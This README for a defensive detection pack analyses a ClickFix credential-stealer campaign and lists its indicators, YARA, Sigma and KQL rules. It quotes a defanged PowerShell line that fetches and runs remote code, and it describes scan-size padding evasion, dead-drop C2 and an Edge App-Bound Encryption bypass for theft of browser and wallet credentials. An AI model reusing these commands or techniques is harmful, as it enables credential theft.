# clickfix-elevation-map-credential-stealer

Blog post: https://blueteam.cool/posts/clickfix-elevation-map-credential-stealer/

## Summary

A ClickFix fake-CAPTCHA lure (`coronadoferrylanding[.]com`) talks a victim
into pasting a PowerShell one-liner into the Windows Run dialog. The pasted
command unwraps through five layers of single-byte XOR and Base64, gated by
a server-side `?_=1` parameter so an ungated request only ever sees a decoy
first stage. The resulting loader sleeps 15 seconds, then downloads a clean
`7z.exe` and a password-protected 7-Zip archive from `enter-code-cdn[.]info`
(`178.16.52[.]101` -- the same IP hosting the PuppetKing / `authorization-*`
operator cluster's loader tier, see the `puppetking-stealc` pack). The
archive contains a single 842MB file; 839MB of it is NULL padding to exceed
AV/EDR/sandbox scan-size ceilings, and the real content is a 3.78MB
garble-obfuscated Go 1.25.4 binary (`cloudflare.exe`) that prints a benign
"Elevation Map" topography report as a decoy.

The implant resolves its live C2 domain by fetching a public Telegram
profile (`t.me/gk6p2s`) and parsing the domain string out of the bio text --
a dead-drop pattern that lets the operator rotate infrastructure by editing
a profile description rather than re-registering a domain. A Steam profile
serves as a fallback resolver with an identical pattern. Confirmed live C2:
`m36.akasia988[.]net`; a second, functionally identical front
(`peluangsm188[.]top`, same subdomain convention and backend responses,
independently registered) was recovered from the Steam dead-drop's config
string.

Once C2-resolved, the implant spawns two throwaway `msedge.exe` instances
(`--no-first-run --disable-gpu about:blank`), each followed within ~1.5s by
two `elevation_service.exe` activations from `services.exe` -- rather than
attacking Chromium's App-Bound Encryption directly, it lets a genuine,
trusted Edge instance satisfy the `IElevator` install-path check and decrypt
the app-bound key itself. It then copies Edge's locked `Login Data`,
`Login Data For Account`, `Network\Cookies`, `History`, and `Web Data` to a
randomised `%TEMP%\<8hex>\<8hex>` staging path and deletes the copies about
one second later. A runtime-decrypted string table recovered from process
memory (native C-format specifiers, not Go's `fmt`) shows a target list of
268 browser extensions (password managers, 2FA/authenticator extensions,
crypto wallets), 40 desktop wallet/password applications, Gecko browser
files, Telegram session data, Discord tokens, Steam accounts, and a general
file grabber rooted at the Desktop and removable drives. Everything staged
leaves as per-file multipart POST uploads. Total time on host across three
detonation rounds: consistently under 90 seconds, with zero persistence.

Confirmed via three rounds of FLARE VM dynamic analysis (ProcMon, Sysmon
with `ArchiveDirectory`, Wireshark, `feintnet` TLS interception, full memory
dump) plus static call-graph analysis (radare2 `pclntab`/`agCd` ground
truth against `main.*`) and passive OSINT on both dead-drop resolvers.

```
ClickFix lure (coronadoferrylanding[.]com)
       |  victim pastes into Win+R
       v
PowerShell  iex(irm 'enter-code-cdn[.]info/<tag>')
       |  XOR-53 -> XOR-105 URL -> ?_=1 server-side gate
       |  XOR-113 x3 + Base64 -> Base64 + XOR-118
       v
Cleartext loader: sleep 15s -> download 7z.exe + payload.7z (7zAES)
       |  extract -plehpffsr
       v
cloudflare.exe -- 842MB (839MB NULL padding, 3.78MB real Go 1.25.4 PE)
       |  garble-obfuscated; decoy main.main prints "Elevation Map"
       v
Dead-drop C2 resolution
       |  GET t.me/gk6p2s (bio text) --or-- steamcommunity.com/profiles/... (fallback)
       v
m36.akasia988[.]net  (+ peluangsm188[.]top, same backend)
       |
       v
Spawn msedge.exe --no-first-run --disable-gpu about:blank x2
       |  elevation_service.exe x4 (via services.exe) -- ABE key decrypted by trusted Edge
       v
Read + stage Login Data / Cookies / History / Web Data -> %TEMP%\<8hex>\<8hex>
       |  268 extension IDs, 40 desktop apps, Gecko, Telegram, Discord, Steam,
       |  Desktop + removable-drive file grabber all in scope
       v
Multipart POST exfil (token/build_id/mode/file_name/file_data) -> wipe staging -> exit (~87s)
```

## What is included

| File | Description |
|------|-------------|
| `iocs.csv` | All indicators: domains, IPs, URLs, hashes, campaign tag, 7z password, build IDs, staging path pattern, user-agent |
| `rule.yar` | Four YARA rules: the ClickFix/loader-chain pattern, the garble-obfuscated "Elevation Map" implant, network/host indicators confirmed via dynamic detonation, and a memory-scan rule for the runtime-decrypted stealer module strings |
| `sigma-clickfix-ps-stager.yml` | Sigma rule for hidden-window `iex`+`irm` PowerShell parented by `explorer.exe` |
| `sigma-edge-abe-bypass.yml` | Sigma rule for a non-browser process spawning Edge/Chrome with `--no-first-run about:blank` -- the App-Bound Encryption bypass launch signature, and the highest-fidelity single detection in the chain |
| `sigma-temp-staged-sqlite.yml` | Sigma rule for file creation under the `%TEMP%\<8hex>\<8hex>` browser-DB staging pattern |
| `kql.md` | Six KQL queries for Defender XDR / Sentinel: ClickFix stager, Edge-spawn + elevation_service correlation, staged/wiped TEMP files, known-infrastructure network hits, dead-drop resolver access by non-browser processes, oversized-PE heuristic |

## Coverage notes

### What these detections cover

- The ClickFix paste-and-run PowerShell stager pattern (hidden window, `iex`+`irm`, parented by `explorer.exe`)
- The `enter-code-cdn[.]info` / `178.16.52[.]101` loader-tier infrastructure and the `coronadoferrylanding[.]com` lure
- The confirmed implant C2 domains (`m36.akasia988[.]net`, `peluangsm188[.]top`) and their Cloudflare-fronting IPs
- The Telegram/Steam dead-drop resolver URLs
- The App-Bound Encryption bypass launch signature (non-browser process spawning Edge/Chrome with `--no-first-run about:blank`) -- family-independent, fires before any credential DB is touched
- The staged-then-wiped `%TEMP%\<8hex>\<8hex>` browser-DB copy pattern
- The oversized-PE / NULL-padding binary-bloating heuristic
- Runtime-decrypted stealer-module strings recoverable from process memory (YARA memory-scan rule)

### What they do NOT cover

- **The garble `-literals` decryption of the C2 host/config at rest**: these are runtime-decrypted; nothing in the on-disk PE reveals the C2 address statically. Detection here relies on network/behavioural indicators, not static string matching.
- **The exact App-Bound-Encryption key-acquisition step**: the source detonation's Sysmon config did not log EID 10 (ProcessAccess), so whether the implant reads the key from `msedge.exe` memory or via another route is unproven -- only the spawn mechanism is confirmed. Enable EID 10 targeting `msedge.exe`/`chrome.exe` if you want to close this gap.
- **Domain rotation**: both dead-drops are live, editable config surfaces (a Telegram bio, a Steam display name). The domain IOCs in `iocs.csv` will go stale on rotation; the dead-drop URLs themselves are the more durable pivot.
- **Confirmed data exfiltration of credentials**: on the analysis VM, all browser credential/wallet stores were empty, so the capability is confirmed but no real credential data was observed leaving the host in these runs. Treat any live host that ran this sample as a confirmed breach regardless.
- **Whether the stealer core is embedded in the 842MB Go binary or delivered post-check-in by the C2**: assessed as probable-embedded (C-style format specifiers, fixed 32-byte-slot decrypted-in-place table) but not proven.
- **The APC-based execution/injection capability** (`run method: %s` / `apc method: %s` strings) and **screenshot capability** (GDI+/WIC DLLs loaded): both present as capability, neither exercised in any of three detonation rounds -- no detection logic here targets them specifically.

## False-positive notes

**`sigma-clickfix-ps-stager.yml`**: The `filter_legitimate` block excludes `microsoft.com` to suppress common winget/Windows Update one-liners. Extend the filter for any internal tooling that uses `irm`+`iex`. Expect low FP on non-developer endpoints; higher in DevOps environments.

**`sigma-edge-abe-bypass.yml`**: No known false positives from the source case. Some enterprise browser-management, EDR-sensor health-check, or RMM tooling launches a headless/throwaway browser with similar flags -- baseline your fleet's management agents before enabling this at "high" severity. The `filter_legitimate_parent` excludes browser-to-browser spawns (normal helper-process behaviour); it does not exclude legitimate automation tooling, which you'll need to add per-environment.

**`sigma-temp-staged-sqlite.yml`**: The bare filename-shape match (8 hex / 8 hex, no extension) can coincidentally match legitimate low-volume temp-file usage. Raise confidence by correlating with a matching `FileDelete` on the same `ProcessGuid` within a few seconds and content starting `SQLite format 3` -- the rule intentionally stays at `medium` for this reason.

**KQL query 4 (network hits on campaign infrastructure)**: Will only fire while the listed domains/IPs remain live and unrotated; treat as a point-in-time hunt, not a durable detection.

**KQL query 5 (dead-drop access by non-browser process)**: Low FP expected -- legitimate business reasons for a non-browser process to fetch a specific Telegram/Steam profile URL are rare, but corporate chat-bot or social-media-monitoring tooling could trigger it. Exclude known automation service accounts if present.

## Confidence

**Infrastructure and C2: high.** All domains, IPs, and dead-drop URLs were directly observed during three independent dynamic-detonation rounds and cross-verified via passive OSINT on both dead-drop platforms. `178.16.52[.]101` is a direct IOC match to the loader-tier infrastructure documented in the `puppetking-stealc` pack, indicating shared delivery infrastructure across campaigns -- noted as an infrastructure-clustering pivot, not an actor attribution claim.

**Payload chain and capability: high.** The full PowerShell unwrap chain, the binary-padding technique, the garble-obfuscated Go loader, the App-Bound Encryption bypass mechanism, and the exfiltration protocol were all confirmed via dynamic detonation with corroborating static analysis (call-graph ground truth for what the Go binary itself reaches).

**Target inventory breadth (268 extensions / 40 apps): high for the list itself** (recovered directly from a runtime-decrypted string table, byte-for-byte), **not exercised for confirmed real-world exfiltration** (the analysis VM had none of these applications installed, so all wallet/password-manager probes returned not-found).

**Attribution to a specific actor or group: not claimed.** The shared `178.16.52[.]101` infrastructure and `/p/<hash>` -> `no` beacon idiom match prior cases in this operator cluster's toolset, but that is an infrastructure/tooling overlap observation, not a named-actor conclusion.

## Related detections

- [iocs.csv](iocs.csv) -- all indicators
- [rule.yar](rule.yar) -- YARA rules
- [sigma-clickfix-ps-stager.yml](sigma-clickfix-ps-stager.yml) -- Sigma: ClickFix PowerShell stager
- [sigma-edge-abe-bypass.yml](sigma-edge-abe-bypass.yml) -- Sigma: App-Bound Encryption bypass launch signature
- [sigma-temp-staged-sqlite.yml](sigma-temp-staged-sqlite.yml) -- Sigma: staged browser-DB files in TEMP
- [kql.md](kql.md) -- KQL queries for Defender XDR / Sentinel
